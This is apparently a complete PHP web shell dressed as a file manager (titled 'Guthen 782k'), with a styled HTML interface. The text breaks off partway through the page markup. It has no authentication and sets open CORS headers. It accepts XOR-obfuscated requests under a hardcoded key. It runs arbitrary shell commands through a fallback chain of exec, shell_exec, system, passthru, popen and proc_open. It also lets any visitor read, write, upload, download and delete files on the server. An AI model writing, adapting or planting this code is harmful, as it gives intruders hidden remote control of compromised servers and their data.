<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type');

$encryptionKey = '06546264929002830782786339926235';
$os = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'windows' : 'linux';
$homeDir = str_replace('\\', '/', dirname(__FILE__));

function formatFileSize($size)
{
    if ($size === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $power = floor(log($size) / log(1024));
    return round($size / (1024 ** $power), 2) . ' ' . $units[$power];
}

function octalToRwx($octal)
{
    $rwx = '';
    $rwx .= ($octal & 4) ? 'r' : '-';
    $rwx .= ($octal & 2) ? 'w' : '-';
    $rwx .= ($octal & 1) ? 'x' : '-';
    return $rwx;
}

function formatPermissions($perms)
{
    $octal = substr(sprintf('%o', $perms), -3);

    return array(
        'owner' => octalToRwx($octal[0]),
        'group' => octalToRwx($octal[1]),
        'other' => octalToRwx($octal[2]),
    );
}

function padKey($key, $length = 32)
{
    $keyBytes = str_split($key);
    $padded = array_fill(0, $length, 0);

    for ($i = 0; $i < min(strlen($key), $length); $i++) {
        $padded[$i] = ord($keyBytes[$i]);
    }

    return $padded;
}

function isAccessible($path)
{
    return is_readable($path);
}

function exe($command, &$exitCode = null)
{
    $output = '';

    if (function_exists('exec')) {
        exec($command . ' 2>&1', $outputLines, $exitCode);
        $output = implode("\n", $outputLines);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($command . ' 2>&1');
        $exitCode = 0; // shell_exec does not provide exit code
    } else if (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $exitCode);
        $output = ob_get_clean();
    } else if (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $exitCode);
        $output = ob_get_clean();
    } else if (function_exists('popen')) {
        $handle = popen($command . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 2096);
            }
            pclose($handle);
            $exitCode = 0; // popen does not provide exit code
        } else {
            $output = 'Failed to open process.';
            $exitCode = 1;
        }
    } else if (function_exists('proc_open')) {
        $descriptorspec = [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errorOutput = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $exitCode = proc_close($process);
            if ($errorOutput) {
                $output .= "\n" . $errorOutput;
            }
        } else {
            $output = 'Failed to open process.';
            $exitCode = 1;
        }
    } else {
        $output = 'No execution functions available.';
    }
    return $output ?: 'Command executed with no output.';
}

function dec($ciphertext)
{
    global $encryptionKey;

    try {
        $keyBytes = padKey($encryptionKey);
        $encrypted = str_split(base64_decode($ciphertext));
        $decrypted = [];

        for ($i = 0; $i < count($encrypted); $i++) {
            $decrypted[] = ord($encrypted[$i]) ^ $keyBytes[$i % count($keyBytes)];
        }

        return implode('', array_map('chr', $decrypted));
    } catch (Exception $e) {
        throw new Exception('Decryption failed: ' . $e->getMessage());
    }
}


$currentPath = isset($_GET['path']) ? $_GET['path'] : realpath('.');
$currentPath = str_replace('\\', '/', $currentPath);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
    $path = isset($_POST['path']) ? $_POST['path'] : $currentPath;
    $uploadedFiles = [];
    
    if (!empty($_FILES['files']['name'])) {
        foreach ($_FILES['files']['name'] as $key => $name) {
            if ($_FILES['files']['error'][$key] === UPLOAD_ERR_OK) {
                $tmpName = $_FILES['files']['tmp_name'][$key];
                $destination = $path . DIRECTORY_SEPARATOR . basename($name);
                
                if (move_uploaded_file($tmpName, $destination)) {
                    $uploadedFiles[] = $name;
                }
            }
        }
    }
    
    echo json_encode([
        'success' => !empty($uploadedFiles),
        'files' => $uploadedFiles
    ]);
    exit;
}

$rawInput = file_get_contents('php://input');

if (substr($rawInput, 0, 10) === 'ENCRYPTED:') {
    $encryptedData = substr($rawInput, 10);
    $decryptedData = dec($encryptedData);
    $input = json_decode($decryptedData, true);
} else {
    $input = json_decode($rawInput, true);
}

$action = isset($input['action']) ? $input['action'] : null;


$response = null;

switch ($action) {
    case 'list':
        $files = [];
        $path = isset($input['path']) ? $input['path'] : $currentPath;
        
        if (!isAccessible($path)) {
            $response = ['success' => false, 'error' => 'Directory is not accessible'];
        } else if (!is_dir($path)) {
            $response = ['success' => false, 'error' => 'Path is not a directory'];
        } else {
            $items = scandir($path);

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;

                $itemPath = $path . DIRECTORY_SEPARATOR . $item;

                $stat = stat($itemPath);
                $files[] = [
                    'name' => $item,
                    'type' => is_dir($itemPath) ? 'folder' : 'file',
                    'size' => is_file($itemPath) ? formatFileSize($stat['size']) : null,
                    'path' => str_replace('\\', '/', realpath($itemPath)),
                    'modified' => date('Y-m-d H:i:s', filemtime($itemPath)),
                    'permissions' => formatPermissions($stat['mode'])
                ];
            }
        }
        $response = ['success' => true, 'files' => $files];
        break;
    case 'mkdir':
        $path = isset($input['path']) ? $input['path'] : $currentPath;
        $name = isset($input['name']) ? $input['name'] : null;

        if ($name) {
            $newDir = $path . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newDir)) {
                $response = ['success' => false, 'error' => 'Directory already exists'];
            } else if (mkdir($newDir, 0755)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to create directory'];
            }
        }
        break;
    case 'read':
        $filepath = isset($input['path']) ? $input['path'] : null;

        if (!is_file($filepath)) {
            $response = ['success' => false, 'error' => 'File does not exist'];
        } else {
            $content = file_get_contents($filepath);
            $response = ['success' => true, 'content' => $content];
        }
        break;
    case 'touch':
        $path = isset($input['path']) ? $input['path'] : $currentPath;
        $name = isset($input['name']) ? $input['name'] : null;

        if ($name) {
            $newFile = $path . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newFile)) {
                $response = ['success' => false, 'error' => 'File already exists'];
            } else if (touch($newFile)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to create file'];
            }
        }
        break;
    case 'write':
        $filepath = isset($input['path']) ? $input['path'] : null;
        $content = isset($input['content']) ? $input['content'] : '';

        if (function_exists('file_put_contents')) {
            if (file_put_contents($filepath, $content) !== false) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to write to file'];
            }
        } else if (function_exists('fopen') && function_exists('fwrite') && function_exists('fclose')) {
            $handle = fopen($filepath, 'w');
            if ($handle) {
                if (fwrite($handle, $content) !== false) {
                    fclose($handle);
                    $response = ['success' => true];
                } else {
                    fclose($handle);
                    $response = ['success' => false, 'error' => 'Failed to write to file'];
                }
            } else {
                $response = ['success' => false, 'error' => 'Failed to open file for writing'];
            }
        } else {
            $response = ['success' => false, 'error' => 'file_put_contents function is disabled'];
        }
        break;
    case 'delete':
        $itemPath = isset($input['path']) ? $input['path'] : null;

        if (!file_exists($itemPath)) {
            $response = ['success' => false, 'error' => 'Item does not exist'];
        } else if (is_dir($itemPath)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($itemPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    rmdir($file->getRealPath());
                } else {
                    unlink($file->getRealPath());
                }
            }

            if (rmdir($itemPath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to delete directory'];
            }
        } else {
            if (unlink($itemPath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to delete file'];
            }
        }
        break;
    case 'rename':
        $oldpath = isset($input['oldPath']) ? $input['oldPath'] : null;
        $newName = isset($input['newName']) ? $input['newName'] : null;

        if ($oldpath && $newName) {
            $newpath = dirname($oldpath) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($newpath)) {
                $response = ['success' => false, 'error' => 'A file or directory with the new name already exists'];
            } else if (rename($oldpath, $newpath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to rename item'];
            }
        }
        break;
    case 'download':
        $filePath = isset($input['path']) ? $input['path'] : null;
        if (!is_file($filePath)) {
            $response = ['success' => false, 'error' => 'File does not exist'];
        } else {
            $content = file_get_contents($filePath);
            $response = ['success' => true, 'content' => base64_encode($content)];
        }
        break;
    case 'terminal':
        $cmd = isset($input['cmd']) ? $input['cmd'] : null;
        $args = isset($input['args']) ? $input['args'] : [];
        $currentPath = isset($input['currentPath']) ? $input['currentPath'] : $homeDir;

        $output = '';
        $newPath = null;

        if (is_dir($currentPath)) {
            chdir($currentPath);
        } else {
            chdir($homeDir);
            $currentPath = $homeDir;
        }

        switch ($cmd) {
            case 'cd':
                $target = isset($args[0]) ? $args[0] : '';

                if ($target === '' || $target === '~') {
                    $newPath = $homeDir;
                } elseif ($target === '..') {
                    $parentPath = dirname($currentPath);
                    $newPath = $parentPath === $currentPath ? $currentPath : $parentPath;
                } else {
                    if (substr($target, 0, 1) === '/') {
                        $targetPath = $target;
                    } else {
                        $targetPath = $currentPath . ($currentPath === '/' ? '' : '/') . $target;
                    }

                    $realTargetPath = realpath($targetPath);

                    if ($realTargetPath && is_dir($realTargetPath)) {
                        $newPath = $realTargetPath;
                    } else {
                        $output = '<div class="command-error">Directory not found: ' . htmlspecialchars($target) . '</div>';
                    }
                }
                break;
            default:
                if (!empty($args)) {
                    $cmd .= ' ' . implode(' ', array_map('escapeshellarg', $args));
                }

                $result = exe($cmd, $exitCode);

                if ($result !== false && $result !== null) {

                    $result = trim($result);

                    if (!empty($result)) {
                        $cssClass = $exitCode === 0 ? 'command-output' : 'command-error';

                        if (in_array($cmd, ['ls', 'dir'])) {
                            $lines = explode("\n", $result);
                            $coloredOutput = '';
                            foreach ($lines as $line) {
                                if (empty(trim($line))) continue;
                                if (preg_match('/^[d\-lrwx]/', $line)) {
                                    $coloredOutput .= htmlspecialchars($line) . '<br>';
                                } else {
                                    $items = preg_split('/\s+/', trim($line));
                                    foreach ($items as $item) {
                                        if (empty($item)) continue;

                                        $itemPath = $currentPath . ($currentPath === '/' ? '' : '/') . $item;
                                        if (is_dir($itemPath)) {
                                            $coloredOutput .= '<span style="color: #fbbf24; font-weight: bold;">' . htmlspecialchars($item) . '</span>  ';
                                        } elseif (is_executable($itemPath)) {
                                            $coloredOutput .= '<span style="color: #10b981; font-weight: bold;">' . htmlspecialchars($item) . '</span>  ';
                                        } elseif (is_link($itemPath)) {
                                            $coloredOutput .= '<span style="color: #06b6d4;">' . htmlspecialchars($item) . '</span>  ';
                                        } else {
                                            $coloredOutput .= '<span style="color: #e2e8f0;">' . htmlspecialchars($item) . '</span>  ';
                                        }
                                    }
                                    $coloredOutput .= '<br>';
                                }
                            }
                            $output = '<div class="' . $cssClass . '">' . $coloredOutput . '</div>';
                        } elseif (in_array($cmd, ['cat', 'less', 'more', 'head', 'tail'])) {
                            $output = '<div class="' . $cssClass . '"><pre style="white-space: pre-wrap; font-family: monospace;">' . htmlspecialchars($result) . '</pre></div>';
                        } elseif ($cmd === 'ps') {
                            $output = '<div class="' . $cssClass . '"><pre style="font-family: monospace; font-size: 12px;">' . htmlspecialchars($result) . '</pre></div>';
                        } elseif (in_array($cmd, ['df', 'du', 'free', 'lsblk', 'mount'])) {
                            $output = '<div class="' . $cssClass . '"><pre style="font-family: monospace; font-size: 12px;">' . htmlspecialchars($result) . '</pre></div>';
                        } else {
                            $output = '<div class="' . $cssClass . '">' . nl2br(htmlspecialchars($result)) . '</div>';
                        }
                    } else {
                        if ($exitCode === 0) {
                            $output = '<div class="command-success">Command executed successfully with no output.</div>';
                        } else {
                            $output = '<div class="command-error">Command failed with exit code ' . $exitCode . '.</div>';
                        }
                    }
                } else {
                    $output = '<div class="command-error">Command execution failed.</div>';
                }
                break;
        }
        $response = ['success' => true, 'output' => $output, 'newPath' => $newPath ?: $currentPath];
    default:
        break;
}

if ($response) {
    echo json_encode($response);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guthen 782k</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.13.3/cdn.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e2e8f0;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            border: 1px solid rgba(71, 85, 105, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #1e293b, #334155);
            color: #f1f5f9;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(71, 85, 105, 0.5);
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .btn-primary {
            background: rgba(59, 130, 246, 0.8);
            color: white;
            border: 1px solid rgba(59, 130, 246, 0.5);
        }

        .btn-primary:hover {
            background: rgba(59, 130, 246, 1);
            transform: translateY(-2px);
        }

        .breadcrumb {
            padding: 20px 30px;
            background: rgba(15, 23, 42, 0.6);
            border-bottom: 1px solid rgba(71, 85, 105, 0.3);
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }

        .breadcrumb-item {
            display: flex;
            align-items: center;
            color: #94a3b8;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .breadcrumb-item:hover {
            background: rgba(71, 85, 105, 0.3);
            color: #e2e8f0;
        }

        .breadcrumb-item.active {
            color: #e2e8f0;
            font-weight: 500;
        }

        .breadcrumb-separator {
            color: #64748b;
            margin: 0 4px;
        }

        .file-table-container {
            padding: 0;
            overflow-x: auto;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
        }

        .file-table thead {
            background: rgba(15, 23, 42, 0.8);
            border-bottom: 2px solid rgba(71, 85, 105, 0.3);
        }

        .file-table th {
            padding: 16px 20px;
            text-align: left;
            font-weight: 600;
            color: #f1f5f9;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-right: 1px solid rgba(71, 85, 105, 0.2);
        }

        .file-table th:last-child {
            border-right: none;
        }

        .file-table tbody tr {
            border-bottom: 1px solid rgba(71, 85, 105, 0.2);
            transition: all 0.2s ease;
        }

        .file-table tbody tr:hover {
            background: rgba(59, 130, 246, 0.1);
            border-color: rgba(59, 130, 246, 0.3);
        }

        .file-table tbody tr.folder {
            background: rgba(251, 191, 36, 0.05);
        }

        .file-table tbody tr.folder:hover {
            background: rgba(251, 191, 36, 0.15);
            border-color: rgba(251, 191, 36, 0.3);
        }

        .file-table td {
            padding: 16px 20px;
            vertical-align: middle;
            border-right: 1px solid rgba(71, 85, 105, 0.1);
            color: #e2e8f0;
        }

        .file-table td:last-child {
            border-right: none;
        }

        .file-icon-cell {
            width: 60px;
            text-align: center;
        }

        .file-icon {
            font-size: 24px;
            color: #3b82f6;
        }

        .file-table tbody tr.folder .file-icon {
            color: #fbbf24;
        }

        .file-name-cell {
            font-weight: 500;
            cursor: pointer;
        }

        .file-name-cell:hover {
            color: #3b82f6;
        }

        .file-table tbody tr.folder .file-name-cell:hover {
            color: #fbbf24;
        }

        .file-size-cell {
            color: #94a3b8;
            font-size: 13px;
        }

        .permissions-cell {
            width: 120px;
        }

        .permissions-display {
            display: flex;
            gap: 8px;
            align-items: center;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .permission-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
        }

        .permission-label {
            font-size: 10px;
            color: #94a3b8;
            text-transform: uppercase;
            font-weight: 600;
        }

        .permission-indicators {
            display: flex;
            gap: 2px;
        }

        .permission-indicator {
            width: 8px;
            height: 8px;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            font-weight: bold;
            color: white;
        }

        .permission-indicator.granted {
            background: #10b981;
        }

        .permission-indicator.denied {
            background: #ef4444;
        }

        .file-actions-cell {
            width: 200px;
        }

        .file-actions {
            display: flex;
            gap: 8px;
            opacity: 0.7;
            transition: opacity 0.3s ease;
        }

        .file-table tbody tr:hover .file-actions {
            opacity: 1;
        }

        .action-btn {
            width: 32px;
            height: 32px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            font-size: 14px;
        }

        .action-btn.edit {
            background: #3b82f6;
            color: white;
        }

        .action-btn.download {
            background: #10b981;
            color: white;
        }

        .action-btn.rename {
            background: #f59e0b;
            color: white;
        }

        .action-btn.delete {
            background: #ef4444;
            color: white;
        }

        .action-btn:hover {
            transform: scale(1.1);
        }

        /* Terminal Styles */
        .terminal-container {
            background: rgba(15, 23, 42, 0.95);
            border-top: 2px solid rgba(71, 85, 105, 0.5);
            height: 0;
            overflow: hidden;
            transition: height 0.3s ease;
            font-family: 'Courier New', Monaco, monospace;
        }

        .terminal-container.active {
            height: 300px;
        }

        .terminal-header {
            background: rgba(30, 41, 59, 0.9);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(71, 85, 105, 0.3);
        }

        .terminal-title {
            color: #e2e8f0;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-controls {
            display: flex;
            gap: 8px;
        }

        .terminal-btn {
            width: 28px;
            height: 28px;
            border: none;
            background: rgba(71, 85, 105, 0.3);
            color: #94a3b8;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .terminal-btn:hover {
            background: rgba(71, 85, 105, 0.5);
            color: #e2e8f0;
        }

        .terminal-output {
            height: 200px;
            overflow-y: auto;
            padding: 15px 20px;
            background: rgba(15, 23, 42, 0.8);
            color: #e2e8f0;
            font-size: 13px;
            line-height: 1.4;
        }

        .terminal-output::-webkit-scrollbar {
            width: 8px;
        }

        .terminal-output::-webkit-scrollbar-track {
            background: rgba(71, 85, 105, 0.1);
        }

        .terminal-output::-webkit-scrollbar-thumb {
            background: rgba(71, 85, 105, 0.5);
            border-radius: 4px;
        }

        .terminal-output::-webkit-scrollbar-thumb:hover {
            background: rgba(71, 85, 105, 0.7);
        }

        .terminal-welcome {
            color: #3b82f6;
            margin-bottom: 15px;
        }

        .welcome-line {
            margin-bottom: 4px;
        }

        .terminal-line {
            margin-bottom: 8px;
            word-wrap: break-word;
        }

        .command-line {
            color: #94a3b8;
            margin-bottom: 4px;
        }

        .command-output {
            color: #e2e8f0;
            margin-bottom: 8px;
            padding-left: 0;
        }

        .command-error {
            color: #ef4444;
            margin-bottom: 8px;
        }

        .command-success {
            color: #10b981;
            margin-bottom: 8px;
        }

        .terminal-input-container {
            background: rgba(30, 41, 59, 0.9);
            padding: 12px 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-top: 1px solid rgba(71, 85, 105, 0.3);
        }

        .terminal-prompt {
            color: #10b981;
            font-weight: 600;
            white-space: nowrap;
            font-size: 14px;
        }

        .prompt-user {
            color: #3b82f6;
        }

        .prompt-host {
            color: #e2e8f0;
        }

        .prompt-path {
            color: #fbbf24;
        }

        .terminal-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e2e8f0;
            font-family: 'Courier New', Monaco, monospace;
            font-size: 14px;
            outline: none;
            padding: 4px 0;
        }

        .terminal-input::placeholder {
            color: #64748b;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: #1e293b;
            border: 1px solid rgba(71, 85, 105, 0.3);
            border-radius: 16px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #e2e8f0;
        }

        .modal-header {
            margin-bottom: 20px;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #f1f5f9;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(71, 85, 105, 0.5);
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease;
            background: rgba(15, 23, 42, 0.5);
            color: #e2e8f0;
        }

        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .form-textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(71, 85, 105, 0.5);
            border-radius: 8px;
            font-size: 14px;
            min-height: 200px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            background: rgba(15, 23, 42, 0.5);
            color: #e2e8f0;
        }

        .form-textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .modal-actions {
            display: flex;
            gap: 12px;
            justify-content: flex-end;
        }

        .btn-secondary {
            background: #475569;
            color: white;
        }

        .btn-secondary:hover {
            background: #334155;
        }

        .btn-success {
            background: #10b981;
            color: white;
        }

        .btn-success:hover {
            background: #059669;
        }

        .btn-danger {
            background: #ef4444;
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #94a3b8;
        }

        .spinner {
            border: 4px solid #475569;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #94a3b8;
        }

        .empty-state i {
            font-size: 64px;
            margin-bottom: 20px;
            color: #475569;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .file-table-container {
                padding: 0;
            }

            .file-table th,
            .file-table td {
                padding: 12px 8px;
                font-size: 12px;
            }

            .permissions-display {
                flex-direction: column;
                gap: 4px;
            }

            .permission-group {
                flex-direction: row;
                gap: 4px;
            }

            .permission-label {
                min-width: 25px;
            }

            .file-actions {
                flex-wrap: wrap;
                gap: 4px;
            }

            .action-btn {
                width: 28px;
                height: 28px;
                font-size: 12px;
            }

            .header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }

            .breadcrumb {
                padding: 15px 20px;
            }

            .terminal-container {
                height: 250px;
            }

            .terminal-input-container {
                padding: 8px 12px;
            }

            .terminal-prompt {
                font-size: 12px;
            }

            .terminal-input {
                font-size: 12px;
            }
        }
    </style>
</head>

<body>
    <div class="container" x-data="fileManager()">
        <!-- Header -->
        <div class="header">
            <h1>
                <i class="fas fa-folder"></i>
                Guthen@Biomorp
            </h1>
            <div class="actions">
                <button class="btn btn-primary" @click="createFile()">
                    <i class="fas fa-file"></i>
                    New File
                </button>
                <button class="btn btn-primary" @click="createFolder()">
                    <i class="fas fa-folder-plus"></i>
                    New Folder
                </button>
                <button class="btn btn-primary" @click="uploadFile()">
                    <i class="fas fa-upload"></i>
                    Upload
                </button>
                <button class="btn btn-primary" @click="toggleTerminal()">
                    <i class="fas fa-terminal"></i>
                    Terminal
                </button>
            </div>
        </div>

        <!-- Breadcrumb -->
        <nav class="breadcrumb">
            <span class="breadcrumb-item" @click="navigateTo('<?php echo $homeDir; ?>')">
                <i class="fas fa-home"></i>
            </span>
            <template x-for="(part, index) in breadcrumbs" :key="index">
                <span>
                    <!-- <span class="breadcrumb-separator"><i class="fas fa-chevron-right"></i></span> -->
                    <span class="breadcrumb-item"
                        @click="navigateTo(part.path)"
                        :class="{ 'active': index === breadcrumbs.length - 1 }"
                        x-text="part.name">
                    </span>
                </span>
            </template>
        </nav>

        <!-- File Table -->
        <div class="file-table-container">
            <div x-show="loading" class="loading">
                <div class="spinner"></div>
                <p>Loading files...</p>
            </div>

            <div x-show="!loading && files.length === 0" class="empty-state">
                <i class="fas fa-folder-open"></i>
                <h3>This folder is empty</h3>
                <p>Upload files or create new folders to get started.</p>
            </div>

            <table x-show="!loading && files.length > 0" class="file-table">
                <thead>
                    <tr>
                        <th class="file-icon-cell">Type</th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Modified</th>
                        <th class="permissions-cell">Permissions</th>
                        <th class="file-actions-cell">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <template x-for="file in sortedFiles" :key="file.name">
                        <tr :class="{ 'folder': file.type === 'folder' }"
                            @dblclick="file.type === 'folder' ? navigateTo(file.path) : null">
                            <td class="file-icon-cell">
                                <i class="file-icon" :class="getFileIcon(file)"></i>
                            </td>
                            <td class="file-name-cell"
                                @click="file.type === 'folder' ? navigateTo(file.path) : null"
                                x-text="file.name">
                            </td>
                            <td class="file-size-cell" x-text="file.size || '-'"></td>
                            <td class="file-size-cell" x-text="file.modified"></td>
                            <td class="permissions-cell" x-html="formatPermissions(file.permissions)"></td>
                            <td class="file-actions-cell">
                                <div class="file-actions">
                                    <button x-show="file.type === 'file'"
                                        class="action-btn edit"
                                        @click="editFile(file)"
                                        title="Edit">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <button x-show="file.type === 'file'"
                                        class="action-btn download"
                                        @click="downloadFile(file)"
                                        title="Download">
                                        <i class="fas fa-download"></i>
                                    </button>
                                    <button class="action-btn rename"
                                        @click="renameItem(file)"
                                        title="Rename">
                                        <i class="fas fa-pencil-alt"></i>
                                    </button>
                                    <button class="action-btn delete"
                                        @click="deleteItem(file)"
                                        title="Delete">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    </template>
                </tbody>
            </table>
        </div>

        <!-- Terminal -->
        <div class="terminal-container" :class="{ 'active': terminalOpen }">
            <div class="terminal-header">
                <div class="terminal-title">
                    <i class="fas fa-terminal"></i>
                    Terminal - <span x-text="currentPath"></span>
                </div>
                <div class="terminal-controls">
                    <button class="terminal-btn" @click="clearTerminal()" title="Clear">
                        <i class="fas fa-broom"></i>
                    </button>
                    <button class="terminal-btn" @click="toggleTerminal()" title="Close">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            <div class="terminal-output" x-html="terminalOutput" x-ref="terminalOutput"></div>
            <div class="terminal-input-container">
                <span class="terminal-prompt">
                    <span class="prompt-user">guthen</span>@<span class="prompt-host">morgan</span>:<span class="prompt-path" x-text="terminalPath"></span>$
                </span>
                <input type="text"
                    class="terminal-input"
                    x-model="terminalCommand"
                    @keydown.enter="executeCommand()"
                    @keydown.arrow-up.prevent="navigateHistory(-1)"
                    @keydown.arrow-down.prevent="navigateHistory(1)"
                    placeholder="Enter command..."
                    autocomplete="off"
                    x-ref="terminalInput">
            </div>
        </div>

        <!-- Modals -->
        <!-- Rename Modal -->
        <div class="modal" :class="{ 'active': modals.rename }" @click.self="modals.rename = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Rename Item</h3>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name:</label>
                    <input type="text" class="form-input" x-model="renameValue" placeholder="Enter new name">
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.rename = false">Cancel</button>
                    <button class="btn btn-success" @click="confirmRename()">Rename</button>
                </div>
            </div>
        </div>

        <!-- Edit Modal -->
        <div class="modal" :class="{ 'active': modals.edit }" @click.self="modals.edit = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Edit File</h3>
                    <p x-text="editingFile ? editingFile.name : ''"></p>
                </div>
                <div class="form-group">
                    <textarea class="form-textarea"
                        x-model="editContent"
                        placeholder="File content...">
                    </textarea>
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.edit = false">Cancel</button>
                    <button class="btn btn-success" @click="saveFile()">Save</button>
                </div>
            </div>
        </div>

        <!-- New File Modal -->
        <div class="modal" :class="{ 'active': modals.newFile }" @click.self="modals.newFile = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Create New File</h3>
                </div>
                <div class="form-group">
                    <label class="form-label">File Name:</label>
                    <input type="text" class="form-input" x-model="newfileValue" placeholder="Enter file name">
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.newFile = false">Cancel</button>
                    <button class="btn btn-success" @click="confirmCreateFile()">Create</button>
                </div>
            </div>
        </div>

        <!-- Delete Confirmation Modal -->
        <div class="modal" :class="{ 'active': modals.delete }" @click.self="modals.delete = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Confirm Delete</h3>
                    <p>Are you sure you want to delete <strong x-text="deletingItem ? deletingItem.name : ''"></strong>?</p>
                    <p style="color: #ef4444; font-size: 14px; margin-top: 10px;">This action cannot be undone.</p>
                </div>
                <div class="modal-actions">
